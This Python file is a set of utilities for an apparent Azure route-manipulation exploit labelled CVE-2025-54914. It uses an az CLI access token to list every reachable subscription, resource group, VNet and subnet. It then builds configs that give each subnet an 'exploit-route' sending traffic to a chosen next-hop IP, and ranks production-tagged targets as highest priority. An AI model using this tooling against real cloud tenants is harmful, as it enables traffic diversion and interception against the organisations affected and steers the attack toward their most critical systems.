#!/usr/bin/env python3
"""
Utility functions for CVE-2025-54914 Azure Route Exploit
======================================================

Additional utilities for target discovery, configuration management, and analysis.
"""

import json
import requests
import argparse
import logging
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
import subprocess
import re
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class AzureResource:
    """Azure resource information"""
    subscription_id: str
    resource_group: str
    vnet_name: str
    subnet_name: str
    location: str
    tags: Dict[str, str]

class TargetDiscovery:
    """Discovers potential targets in Azure subscriptions"""

    def __init__(self, access_token: str):
        self.access_token = access_token
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json'
        })

    def get_subscriptions(self) -> List[Dict[str, Any]]:
        """Get all accessible subscriptions"""
        try:
            url = "https://management.azure.com/subscriptions"
            params = {'api-version': '2020-01-01'}

            response = self.session.get(url, params=params)
            response.raise_for_status()

            subscriptions = response.json().get('value', [])
            logger.info(f"Found {len(subscriptions)} accessible subscriptions")

            return subscriptions

        except Exception as e:
            logger.error(f"Failed to get subscriptions: {e}")
            return []

    def get_resource_groups(self, subscription_id: str) -> List[Dict[str, Any]]:
        """Get resource groups in subscription"""
        try:
            url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups"
            params = {'api-version': '2021-04-01'}

            response = self.session.get(url, params=params)
            response.raise_for_status()

            resource_groups = response.json().get('value', [])
            logger.info(f"Found {len(resource_groups)} resource groups in {subscription_id}")

            return resource_groups

        except Exception as e:
            logger.error(f"Failed to get resource groups: {e}")
            return []

    def get_virtual_networks(self, subscription_id: str, resource_group: str) -> List[Dict[str, Any]]:
        """Get virtual networks in resource group"""
        try:
            url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Network/virtualNetworks"
            params = {'api-version': '2021-05-01'}

            response = self.session.get(url, params=params)
            response.raise_for_status()

            vnets = response.json().get('value', [])
            logger.info(f"Found {len(vnets)} virtual networks in {resource_group}")

            return vnets

        except Exception as e:
            logger.error(f"Failed to get virtual networks: {e}")
            return []

    def get_subnets(self, subscription_id: str, resource_group: str, vnet_name: str) -> List[Dict[str, Any]]:
        """Get subnets in virtual network"""
        try:
            url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Network/virtualNetworks/{vnet_name}/subnets"
            params = {'api-version': '2021-05-01'}

            response = self.session.get(url, params=params)
            response.raise_for_status()

            subnets = response.json().get('value', [])
            logger.info(f"Found {len(subnets)} subnets in {vnet_name}")

            return subnets

        except Exception as e:
            logger.error(f"Failed to get subnets: {e}")
            return []

    def discover_targets(self, subscription_ids: Optional[List[str]] = None) -> List[AzureResource]:
        """Discover all potential targets"""
        targets = []

        # Get subscriptions
        if subscription_ids:
            subscriptions = [{'subscriptionId': sid} for sid in subscription_ids]
        else:
            subscriptions = self.get_subscriptions()

        for sub in subscriptions:
            subscription_id = sub['subscriptionId']
            logger.info(f"Discovering targets in subscription: {subscription_id}")

            # Get resource groups
            resource_groups = self.get_resource_groups(subscription_id)

            for rg in resource_groups:
                resource_group = rg['name']
                location = rg.get('location', 'unknown')
                tags = rg.get('tags', {})

                # Get virtual networks
                vnets = self.get_virtual_networks(subscription_id, resource_group)

                for vnet in vnets:
                    vnet_name = vnet['name']

                    # Get subnets
                    subnets = self.get_subnets(subscription_id, resource_group, vnet_name)

                    for subnet in subnets:
                        subnet_name = subnet['name']

                        target = AzureResource(
                            subscription_id=subscription_id,
                            resource_group=resource_group,
                            vnet_name=vnet_name,
                            subnet_name=subnet_name,
                            location=location,
                            tags=tags
                        )
                        targets.append(target)

        logger.info(f"Discovered {len(targets)} potential targets")
        return targets

class ConfigurationManager:
    """Manages exploit configurations"""

    @staticmethod
    def create_target_config(targets: List[AzureResource],
                           address_prefix: str = '10.0.1.0/24',
                           next_hop_type: str = 'VirtualAppliance',
                           next_hop_ip: str = '10.0.2.5') -> Dict[str, Any]:
        """Create target configuration from discovered resources"""
        config = {
            'targets': [],
            'metadata': {
                'description': 'Auto-generated target configuration',
                'created': '2025-01-09',
                'version': '1.0',
                'total_targets': len(targets)
            }
        }

        for i, target in enumerate(targets, 1):
            target_config = {
                'subscription_id': target.subscription_id,
                'resource_group': target.resource_group,
                'vnet_name': target.vnet_name,
                'subnet_name': target.subnet_name,
                'route_name': f'exploit-route-{i:03d}',
                'address_prefix': address_prefix,
                'next_hop_type': next_hop_type,
                'next_hop_ip': next_hop_ip,
                'api_version': '2025-09-01',
                'priority': i,
                'location': target.location,
                'tags': target.tags
            }
            config['targets'].append(target_config)

        return config

    @staticmethod
    def save_config(config: Dict[str, Any], filename: str) -> bool:
        """Save configuration to file"""
        try:
            with open(filename, 'w') as f:
                json.dump(config, f, indent=2)
            logger.info(f"Configuration saved to {filename}")
            return True
        except Exception as e:
            logger.error(f"Failed to save configuration: {e}")
            return False

    @staticmethod
    def load_config(filename: str) -> Optional[Dict[str, Any]]:
        """Load configuration from file"""
        try:
            with open(filename, 'r') as f:
                config = json.load(f)
            logger.info(f"Configuration loaded from {filename}")
            return config
        except Exception as e:
            logger.error(f"Failed to load configuration: {e}")
            return None

class ReportGenerator:
    """Generates detailed reports and analysis"""

    @staticmethod
    def generate_discovery_report(targets: List[AzureResource], output_file: str) -> str:
        """Generate target discovery report"""
        report = []
        report.append("=" * 80)
        report.append("Azure Target Discovery Report")
        report.append("=" * 80)
        report.append(f"Total Targets Discovered: {len(targets)}")
        report.append("")

        # Group by subscription
        by_subscription = {}
        for target in targets:
            sub_id = target.subscription_id
            if sub_id not in by_subscription:
                by_subscription[sub_id] = []
            by_subscription[sub_id].append(target)

        for sub_id, sub_targets in by_subscription.items():
            report.append(f"Subscription: {sub_id}")
            report.append(f"Targets: {len(sub_targets)}")
            report.append("-" * 40)

            for target in sub_targets:
                report.append(f"  Resource Group: {target.resource_group}")
                report.append(f"  VNet: {target.vnet_name}")
                report.append(f"  Subnet: {target.subnet_name}")
                report.append(f"  Location: {target.location}")
                if target.tags:
                    report.append(f"  Tags: {', '.join([f'{k}={v}' for k, v in target.tags.items()])}")
                report.append("")

        report_text = "\n".join(report)

        try:
            with open(output_file, 'w') as f:
                f.write(report_text)
            logger.info(f"Discovery report saved to {output_file}")
        except Exception as e:
            logger.error(f"Failed to save discovery report: {e}")

        return report_text

    @staticmethod
    def generate_vulnerability_analysis(targets: List[AzureResource], output_file: str) -> str:
        """Generate vulnerability analysis report"""
        report = []
        report.append("=" * 80)
        report.append("CVE-2025-54914 Vulnerability Analysis")
        report.append("=" * 80)
        report.append(f"Total Vulnerable Targets: {len(targets)}")
        report.append("")

        # Risk assessment
        high_risk = []
        medium_risk = []
        low_risk = []

        for target in targets:
            # Simple risk assessment based on naming patterns and tags
            risk_score = 0

            # Production environment indicators
            if any(keyword in target.resource_group.lower() for keyword in ['prod', 'production', 'live']):
                risk_score += 3
            if any(keyword in target.vnet_name.lower() for keyword in ['prod', 'production', 'live']):
                risk_score += 2

            # Critical tags
            if target.tags:
                if any(keyword in str(target.tags).lower() for keyword in ['critical', 'production', 'live']):
                    risk_score += 2
                if any(keyword in str(target.tags).lower() for keyword in ['test', 'dev', 'staging']):
                    risk_score -= 1

            # Categorize risk
            if risk_score >= 4:
                high_risk.append(target)
            elif risk_score >= 2:
                medium_risk.append(target)
            else:
                low_risk.append(target)

        report.append("RISK ASSESSMENT:")
        report.append(f"High Risk Targets: {len(high_risk)}")
        report.append(f"Medium Risk Targets: {len(medium_risk)}")
        report.append(f"Low Risk Targets: {len(low_risk)}")
        report.append("")

        if high_risk:
            report.append("HIGH RISK TARGETS:")
            report.append("-" * 40)
            for target in high_risk:
                report.append(f"Subscription: {target.subscription_id}")
                report.append(f"Resource Group: {target.resource_group}")
                report.append(f"VNet: {target.vnet_name}")
                report.append(f"Subnet: {target.subnet_name}")
                report.append("")

        report_text = "\n".join(report)

        try:
            with open(output_file, 'w') as f:
                f.write(report_text)
            logger.info(f"Vulnerability analysis saved to {output_file}")
        except Exception as e:
            logger.error(f"Failed to save vulnerability analysis: {e}")

        return report_text

def get_access_token() -> str:
    """Get Azure access token"""
    try:
        result = subprocess.run([
            'az', 'account', 'get-access-token',
            '--resource', 'https://management.azure.com/',
            '--query', 'accessToken',
            '--output', 'tsv'
        ], capture_output=True, text=True, check=True)

        return result.stdout.strip()
    except Exception as e:
        logger.error(f"Failed to get access token: {e}")
        raise

def main():
    """Main utility function"""
    parser = argparse.ArgumentParser(description='CVE-2025-54914 Exploit Utilities')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # Discovery command
    discovery_parser = subparsers.add_parser('discover', help='Discover potential targets')
    discovery_parser.add_argument('--subscription-ids', nargs='+', help='Specific subscription IDs to scan')
    discovery_parser.add_argument('--output', default='discovered_targets.json', help='Output file for discovered targets')
    discovery_parser.add_argument('--report', help='Generate discovery report')

    # Config generation command
    config_parser = subparsers.add_parser('config', help='Generate target configuration')
    config_parser.add_argument('--input', required=True, help='Input file with discovered targets')
    config_parser.add_argument('--output', default='targets_config.json', help='Output configuration file')
    config_parser.add_argument('--address-prefix', default='10.0.1.0/24', help='Address prefix for routes')
    config_parser.add_argument('--next-hop-ip', default='10.0.2.5', help='Next hop IP address')

    # Analysis command
    analysis_parser = subparsers.add_parser('analyze', help='Analyze targets for vulnerability')
    analysis_parser.add_argument('--input', required=True, help='Input file with targets')
    analysis_parser.add_argument('--output', help='Output analysis report')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    try:
        if args.command == 'discover':
            # Get access token
            access_token = get_access_token()

            # Discover targets
            discovery = TargetDiscovery(access_token)
            targets = discovery.discover_targets(args.subscription_ids)

            # Save discovered targets
            config = ConfigurationManager.create_target_config(targets)
            ConfigurationManager.save_config(config, args.output)

            # Generate report if requested
            if args.report:
                ReportGenerator.generate_discovery_report(targets, args.report)

            logger.info(f"Discovery completed. Found {len(targets)} targets.")

        elif args.command == 'config':
            # Load discovered targets and create configuration
            config = ConfigurationManager.load_config(args.input)
            if not config:
                return 1

            # Update configuration with custom parameters
            for target in config['targets']:
                target['address_prefix'] = args.address_prefix
                target['next_hop_ip'] = args.next_hop_ip

            # Save configuration
            ConfigurationManager.save_config(config, args.output)
            logger.info(f"Configuration generated: {args.output}")

        elif args.command == 'analyze':
            # Load targets and analyze
            config = ConfigurationManager.load_config(args.input)
            if not config:
                return 1

            # Convert to AzureResource objects
            targets = []
            for target_data in config['targets']:
                target = AzureResource(
                    subscription_id=target_data['subscription_id'],
                    resource_group=target_data['resource_group'],
                    vnet_name=target_data['vnet_name'],
                    subnet_name=target_data['subnet_name'],
                    location=target_data.get('location', 'unknown'),
                    tags=target_data.get('tags', {})
                )
                targets.append(target)

            # Generate analysis
            output_file = args.output or 'vulnerability_analysis.txt'
            ReportGenerator.generate_vulnerability_analysis(targets, output_file)
            logger.info(f"Analysis completed: {output_file}")

        return 0

    except Exception as e:
        logger.error(f"Error: {e}")
        return 1

if __name__ == '__main__':
    exit(main())